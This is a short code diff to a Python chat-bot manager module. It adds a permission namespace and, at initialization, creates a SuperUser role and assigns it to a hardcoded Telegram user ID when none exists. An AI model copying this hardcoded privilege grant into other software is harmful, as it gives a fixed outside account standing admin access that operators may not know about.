@@ -2,6 +2,7 @@ from core import *
 from core import _
 import logging
 from .general_handler import *
+from .perm import PermissionNS
 
 logger = logging.getLogger('simple_manager')
 
@@ -41,6 +42,11 @@ def get_info(obj):
 
 def initialize():
     register_root(SimpleManager())
+    register_root(PermissionNS())
+    if query_object(f'permission:SuperUser') is None:
+        PermissionNS.instance().exec('addrole SuperUser')
+        PermissionNS.instance().exec('assign SuperUser to telegram:user:109890321')        
     
 def finalize():
-    unregister_root(_('simple_manager'))
+    unregister_root(_(SimpleManager.name))
+    unregister_root(_(PermissionNS.name))
